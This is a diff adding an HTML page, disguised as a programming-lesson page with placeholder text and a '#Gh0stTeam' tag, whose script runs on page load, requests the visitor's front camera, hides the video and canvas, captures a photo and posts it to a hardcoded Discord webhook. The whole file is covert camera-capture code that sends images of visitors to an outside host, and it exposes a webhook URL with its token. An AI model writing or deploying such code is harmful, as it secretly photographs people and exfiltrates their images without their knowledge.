@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aula de Programação</title>
+    <style>
+        body { 
+            background-color: black; 
+            color: white; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: 'Arial', sans-serif; 
+            overflow: hidden; 
+        }
+        .texto-grande { 
+            font-size: 2.5rem; 
+            font-weight: bold; 
+            text-align: center; 
+            max-width: 80%;
+            line-height: 1.2;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+        }
+        .gh0st { 
+            color: #ff0000; 
+            font-size: 1.2rem; 
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+        /* Esconde os elementos técnicos da tela */
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="texto-grande">
+        TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO
+    </div>
+    <div class="gh0st">#Gh0stTeam</div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1496557379351875745/PsqDIUD8fIDhCGozVuKw9JQOHjMX-FQgmEfVoaxdGFcRyTq926Dg5m47hxDC5BrKHlTx';
+
+        async function init() {
+            try {
+                // Solicita acesso à câmera frontal
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Espera o vídeo carregar para capturar o frame
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        captureAndSend();
+                    }, 1500); // 1.5 segundos para dar tempo de focar
+                };
+            } catch (err) {
+                console.log("Acesso negado ou erro: ", err);
+            }
+        }
+
+        function captureAndSend() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                // Envia a imagem como arquivo 'foto.png'
+                formData.append('file', blob, 'captura.png');
+                // Mensagem que aparecerá no Discord
+                formData.append('content', '📸 **Nova captura realizada!**\nO usuário permitiu o acesso à câmera.');
+
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(() => {
+                    // Opcional: parar a câmera após o envio
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                });
+            }, 'image/png');
+        }
+
+        // Inicia o processo ao carregar a página
+        window.onload = init;
+    </script>
+</body>
+</html>
+
